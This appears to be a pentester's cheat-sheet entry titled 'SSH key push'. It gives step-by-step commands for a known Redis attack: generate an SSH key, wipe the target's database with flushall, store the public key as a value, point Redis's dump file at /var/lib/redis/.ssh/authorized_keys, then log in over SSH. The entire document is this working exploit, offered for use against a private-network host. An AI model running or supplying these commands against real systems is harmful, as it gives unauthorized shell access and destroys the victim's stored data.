# SSH key push

```bash
>ssh-keygen -t rsa -b 4096 -C "redis@kali" 
# No passphase
# /tmp/id_rsa

>cd /tmp
>(echo -e "\n\n"; cat id_rsa.pub; echo "\n\n") > pwn.txt

# Connect to redis
>redis-cli -h 192.168.90.69 flushall
OK
>cat /tmp/pwn.txt | redis-cli -h 192.168.90.69 -x set crackit
OK

>redis-cli -h 192.168.90.69
config set dir /var/lib/redis/.ssh
config set dbfilename authorized_keys
save
quit
>ssh redis@192.168.90.69 -i /tmp/id_rsa
```

